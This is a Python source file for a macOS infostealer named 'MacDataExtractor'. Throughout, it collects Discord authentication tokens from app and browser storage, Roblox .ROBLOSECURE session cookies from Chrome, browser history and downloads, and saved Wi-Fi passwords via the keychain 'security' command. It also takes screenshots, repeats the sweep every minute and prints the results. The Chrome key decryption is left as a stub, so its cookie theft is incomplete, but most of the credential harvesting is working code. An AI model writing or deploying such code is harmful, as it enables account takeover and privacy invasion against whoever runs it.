import os
import re
import base64
import shutil
import sqlite3
import subprocess
import datetime
import threading
import time
import json
from pathlib import Path
from queue import Queue
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Util.Padding import unpad
from PIL import ImageGrab

class MacDataExtractor:
    def __init__(self):
        self.home = Path.home()
        self.roaming = self.home / "Library" / "Application Support"
        self.output_dir = self.home / ".mac_data_extractor"
        self.output_dir.mkdir(exist_ok=True, parents=True)
        self.tokens = set()
        self.roblox_cookies = set()
        self.history = []
        self.downloads = []
        self.wifi_info = []
        self.exceptions = []
        self.screenshot_path = self.output_dir / "screenshot.png"
        self.lock = threading.RLock()
        self.chrome_master_key = self._get_chrome_master_key()

    def _get_chrome_master_key(self):
        try:
            local_state_path = self.home / "Library" / "Application Support" / "Google" / "Chrome" / "Local State"
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            encrypted_key_b64 = local_state.get("os_crypt", {}).get("encrypted_key", "")
            encrypted_key = base64.b64decode(encrypted_key_b64)
            # Remove 'DPAPI' prefix (5 bytes)
            encrypted_key = encrypted_key[5:]
            # On macOS encrypted key must be decrypted using Keychain, fallback None here
            # Placeholder: real decryption requires Security framework bindings
            return None
        except Exception as e:
            with self.lock:
                self.exceptions.append(f"MasterKeyErr: {e}")
            return None

    def _decrypt_aes_gcm(self, buff: bytes):
        try:
            if buff[:3] != b'v10':
                return buff.decode(errors='ignore')
            nonce = buff[3:15]
            cipher_text = buff[15:-16]
            tag = buff[-16:]
            if not self.chrome_master_key:
                return ""
            cipher = AES.new(self.chrome_master_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(cipher_text, tag)
            return decrypted.decode(errors='ignore')
        except Exception:
            return ""

    def _grab_tokens_from_path(self, path: Path):
        token_re = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,}")
        if not path.exists():
            return
        try:
            for file in path.glob("*.*"):
                if file.suffix not in {'.log', '.ldb'}:
                    continue
                try:
                    with file.open(errors='ignore') as f:
                        for line in f:
                            for token in token_re.findall(line.strip()):
                                with self.lock:
                                    self.tokens.add(token)
                except Exception as e:
                    with self.lock:
                        self.exceptions.append(f"TokenReadErr:{file.name}: {e}")
        except Exception as e:
            with self.lock:
                self.exceptions.append(f"TokenDirErr:{path}: {e}")

    def grab_all_tokens(self):
        targets = [
            self.roaming / 'discord' / 'Local Storage' / 'leveldb',
            self.roaming / 'discordcanary' / 'Local Storage' / 'leveldb',
            self.roaming / 'Lightcord' / 'Local Storage' / 'leveldb',
            self.roaming / 'discordptb' / 'Local Storage' / 'leveldb',
            self.home / 'Library' / 'Application Support' / 'Google' / 'Chrome' / 'Default' / 'Local Storage' / 'leveldb',
            self.home / 'Library' / 'Application Support' / 'Google' / 'Chrome Beta' / 'Default' / 'Local Storage' / 'leveldb',
            self.home / 'Library' / 'Application Support' / 'Microsoft Edge' / 'Default' / 'Local Storage' / 'leveldb',
            self.home / 'Library' / 'Application Support' / 'BraveSoftware' / 'Brave-Browser' / 'Default' / 'Local Storage' / 'leveldb',
            self.home / 'Library' / 'Application Support' / 'Chromium' / 'Default' / 'Local Storage' / 'leveldb',
        ]
        threads = []
        for p in targets:
            t = threading.Thread(target=self._grab_tokens_from_path, args=(p,))
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

    def grab_roblox_cookies(self):
        cookie_db = self.home / 'Library' / 'Application Support' / 'Google' / 'Chrome' / 'Default' / 'Cookies'
        if not cookie_db.exists():
            return
        temp_db = self.output_dir / "cookies_temp"
        try:
            shutil.copy2(cookie_db, temp_db)
            conn = sqlite3.connect(str(temp_db))
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com%'")
            for host, name, encrypted_value in cursor.fetchall():
                dec = self._decrypt_aes_gcm(encrypted_value)
                if dec and ("roblosecure" in name.lower() or name.lower().startswith(".roblosecure")):
                    with self.lock:
                        self.roblox_cookies.add(dec)
            cursor.close()
            conn.close()
            temp_db.unlink(missing_ok=True)
        except Exception as e:
            with self.lock:
                self.exceptions.append(f"RobloxCookieErr: {e}")

    def grab_history(self):
        history_db = self.home / 'Library' / 'Application Support' / 'Google' / 'Chrome' / 'Default' / 'History'
        if not history_db.exists():
            return
        temp_db = self.output_dir / "history_temp"
        try:
            shutil.copy2(history_db, temp_db)
            conn = sqlite3.connect(str(temp_db))
            cursor = conn.cursor()
            cursor.execute("""
                SELECT url, title, visit_count, typed_count, last_visit_time 
                FROM urls ORDER BY last_visit_time DESC LIMIT 100
            """)
            history = []
            base_time = datetime.datetime(1601, 1, 1)
            for url, title, visit_count, typed_count, last_visit_time in cursor.fetchall():
                visit_dt = base_time + datetime.timedelta(microseconds=last_visit_time)
                history.append({
                    "url": url,
                    "title": title,
                    "visit_count": visit_count,
                    "typed_count": typed_count,
                    "last_visit": visit_dt.strftime("%Y-%m-%d %H:%M:%S"),
                })
            with self.lock:
                self.history = history
            cursor.close()
            conn.close()
            temp_db.unlink(missing_ok=True)
        except Exception as e:
            with self.lock:
                self.exceptions.append(f"HistoryErr: {e}")

    def grab_downloads(self):
        history_db = self.home / 'Library' / 'Application Support' / 'Google' / 'Chrome' / 'Default' / 'History'
        if not history_db.exists():
            return
        temp_db = self.output_dir / "history_temp"
        try:
            shutil.copy2(history_db, temp_db)
            conn = sqlite3.connect(str(temp_db))
            cursor = conn.cursor()
            cursor.execute("""
                SELECT current_path, total_bytes, danger_type, tab_url, end_time, original_mime_type, state, opened 
                FROM downloads ORDER BY start_time DESC LIMIT 50
            """)
            downloads = []
            for row in cursor.fetchall():
                downloads.append({
                    "current_path": row[0],
                    "total_bytes": row[1],
                    "danger_type": row[2],
                    "tab_url": row[3],
                    "end_time": row[4],
                    "mime_type": row[5],
                    "state": row[6],
                    "opened": bool(row[7]),
                })
            with self.lock:
                self.downloads = downloads
            cursor.close()
            conn.close()
            temp_db.unlink(missing_ok=True)
        except Exception as e:
            with self.lock:
                self.exceptions.append(f"DownloadsErr: {e}")

    def grab_wifi_passwords(self):
        try:
            scan_output = subprocess.check_output(
                ["/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", "-s"],
                stderr=subprocess.DEVNULL,
                text=True,
            )
            ssids = []
            for line in scan_output.strip().split("\n")[1:]:
                ssid = line[:32].strip()
                if ssid:
                    ssids.append(ssid)
            wifi_data = []
            for ssid in ssids:
                try:
                    pwd = subprocess.check_output(
                        ["security", "find-generic-password", "-D", "AirPort network password", "-a", ssid, "-w"],
                        stderr=subprocess.DEVNULL,
                        text=True,
                    ).strip()
                except subprocess.CalledProcessError:
                    pwd = ""
                wifi_data.append((ssid, pwd))
            with self.lock:
                self.wifi_info = wifi_data
        except Exception as e:
            with self.lock:
                self.exceptions.append(f"WiFiErr: {e}")

    def take_screenshot(self):
        try:
            img = ImageGrab.grab()
            img.save(self.screenshot_path)
            img.close()
        except Exception as e:
            with self.lock:
                self.exceptions.append(f"ScreenshotErr: {e}")

    def run_all(self):
        funcs = [
            self.grab_all_tokens,
            self.grab_roblox_cookies,
            self.grab_history,
            self.grab_downloads,
            self.grab_wifi_passwords,
            self.take_screenshot,
        ]
        threads = []
        for f in funcs:
            t = threading.Thread(target=f)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

class TerminalOutput:
    def __init__(self, extractor: MacDataExtractor):
        self.extractor = extractor
        self.running = True

    def print_loop(self):
        while self.running:
            time.sleep(15)
            self.print_data()

    def print_data(self):
        with self.extractor.lock:
            print("\n=== DISCORD TOKENS ===")
            for token in sorted(self.extractor.tokens):
                print(token)
            print("\n=== ROBLOX .ROBLOSECURE COOKIES ===")
            for cookie in sorted(self.extractor.roblox_cookies):
                print(cookie)
            print("\n=== BROWSER HISTORY (Last 10) ===")
            for h in self.extractor.history[:10]:
                print(f"{h['last_visit']} | {h['title']} | {h['url']}")
            print("\n=== DOWNLOADS (Last 5) ===")
            for d in self.extractor.downloads[:5]:
                print(f"{d['current_path']} | {d['total_bytes']} bytes | {d['tab_url']}")
            print("\n=== WIFI PASSWORDS ===")
            for ssid, pwd in self.extractor.wifi_info:
                print(f"{ssid:<30} | {pwd}")
            print("\n=== ERRORS ===")
            for e in self.extractor.exceptions[-5:]:
                print(e)
            print("\n=== SCREENSHOT PATH ===")
            print(self.extractor.screenshot_path)

if __name__ == "__main__":
    extractor = MacDataExtractor()
    output = TerminalOutput(extractor)
    threading.Thread(target=output.print_loop, daemon=True).start()
    try:
        while True:
            extractor.run_all()
            time.sleep(60)
    except KeyboardInterrupt:
        output.running = False
